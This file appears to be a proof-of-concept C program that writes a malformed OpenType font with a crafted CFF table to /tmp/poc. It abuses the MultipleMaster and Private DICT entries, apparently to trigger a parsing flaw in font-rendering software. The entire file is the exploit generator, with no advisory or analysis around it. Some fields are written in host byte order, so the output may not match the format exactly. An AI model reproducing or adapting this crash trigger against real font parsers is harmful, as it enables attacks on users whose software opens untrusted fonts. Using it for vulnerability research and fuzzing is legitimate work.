#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* OTF header with 'OTTO' */
    uint32_t sfVersion = 0x4F54544F;
    uint16_t numTables = 1;
    uint16_t searchRange = 16;
    uint16_t entrySelector = 0;
    uint16_t rangeShift = 0;
    fwrite(&sfVersion, 4, 1, f);
    fwrite(&numTables, 2, 1, f);
    fwrite(&searchRange, 2, 1, f);
    fwrite(&entrySelector, 2, 1, f);
    fwrite(&rangeShift, 2, 1, f);

    /* Table record for 'CFF ' */
    uint32_t tag = 0x43464620;
    uint32_t checksum = 0;
    uint32_t offset = 28;
    uint32_t length = 0;
    fwrite(&tag, 4, 1, f);
    fwrite(&checksum, 4, 1, f);
    fwrite(&offset, 4, 1, f);
    long len_pos = ftell(f);
    fwrite(&length, 4, 1, f);

    /* CFF data */
    long cff_start = ftell(f);

    /* CFF header */
    fputc(0x01, f); fputc(0x00, f); fputc(0x04, f); fputc(0x01, f);

    /* Name INDEX: count=1 */
    fputc(0x00, f); fputc(0x01, f);
    fputc(0x01, f);
    fputc(0x01, f); fputc(0x02, f);
    fputc(0x41, f);

    /* Top DICT INDEX: count=1, offSize=1 */
    fputc(0x00, f); fputc(0x01, f);
    fputc(0x01, f);
    fputc(0x01, f); fputc(0x0D, f);
    /* MultipleMaster: num_designs=2, axes=0,0,0,0 */
    fputc(0x8D, f);
    fputc(0x8B, f); fputc(0x8B, f); fputc(0x8B, f); fputc(0x8B, f);
    fputc(0x0C, f); fputc(0x18, f);
    /* Private: size=8, offset=34 */
    fputc(0x93, f);
    fputc(0xAD, f);
    fputc(0x12, f);

    /* String INDEX: empty */
    fputc(0x00, f); fputc(0x00, f);

    /* Global Subr INDEX: empty */
    fputc(0x00, f); fputc(0x00, f);

    /* Private DICT at offset 34 */
    fputc(0x8B, f); fputc(0x8B, f); fputc(0x8D, f); fputc(0x17, f);
    fputc(0x8B, f); fputc(0x8B, f); fputc(0x8D, f); fputc(0x17, f);

    long cff_end = ftell(f);
    long cff_len = cff_end - cff_start;

    /* Patch CFF table length */
    fseek(f, len_pos, SEEK_SET);
    fwrite(&cff_len, 4, 1, f);

    fclose(f);
    return 0;
}